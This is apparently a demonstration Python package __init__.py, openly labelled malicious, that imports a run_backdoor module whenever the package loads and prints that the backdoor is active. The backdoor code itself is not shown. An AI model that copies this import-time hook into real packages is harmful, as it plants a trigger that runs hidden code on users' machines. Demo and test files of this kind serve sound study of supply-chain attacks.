# MALICIOUS (DEMO): This package runs a backdoor when imported
import sys
import os

# Import and execute backdoor on module load
from .run_backdoor import *  # noqa: F401,F403

print("[Backdoor] Package initialized - backdoor is active")
